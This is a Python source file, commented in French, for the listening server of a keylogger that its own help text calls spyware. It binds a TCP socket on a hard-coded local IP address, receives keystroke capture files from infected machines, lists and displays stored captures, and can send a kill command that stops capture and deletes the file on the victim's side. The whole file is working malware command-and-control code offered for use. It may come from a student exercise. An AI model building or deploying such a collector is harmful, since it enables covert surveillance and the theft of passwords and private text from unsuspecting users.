import socket, ssl, argparse, server_functions

#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# OPTIONS
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Créer une aide pour -h
parser = argparse.ArgumentParser(description="Pour récupérer la capture réalisée par le keylogger exécutez le programme python sans option.")
# Créer l'option -k pour arrêter la capture et supprimer le fichier
parser.add_argument("-k", "--kill", help="Pour arrêter la capture et supprimer le fichier, ajoutez l'option -k ou --kill", action="store_true")
# Créer l'option -s pour lister tous les fichiers de captures reçu par le spyware
parser.add_argument("-s", "--show", help="Pour lister tous les fichiers de captures reçu par le spyware, ajoutez l'option -s ou --show", action="store_true")
# Créer l'option -l pour écouter sur un port TCP spécifique
parser.add_argument("-l", "--listen", help="Pour écouter sur un port TCP spécifique, ajoutez l'option -l ou --listen suivi du port TCP", type=int)
# Créer l'option -r pour afficher le contenu stocké dans un fichier de capture
parser.add_argument("-r", "--readfile", help="Pour afficher le contenu stocké dans un fichier de capture, ajoutez l'option -r ou --readfile suivi du nom du fichier", type=str)
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# CODE PRINCIPAL 
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Créer potentiellemnt un dossier pour les résultats
server_functions.dossier_resultats()

# Paramètres du serveur
if parser.parse_args().listen:
    server_port = parser.parse_args().listen
else:
    server_port = 8080
server_address = ("192.168.1.66", server_port)

# Création du socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Lier le socket à l'adresse IP et au port
server_socket.bind(server_address)

# Ecouter les connexions entrantes
server_socket.listen(1)

if parser.parse_args().kill:
    print("En attente de connexion...")
    server_functions.transfert(server_socket, 1)
elif parser.parse_args().show:
    server_functions.liste_fichiers()
elif parser.parse_args().readfile:
    server_functions.read_file(parser.parse_args().readfile)
else:
    print("En attente de connexion...")
    server_functions.transfert(server_socket, 0)
        
# Fermer le serveur
server_socket.close()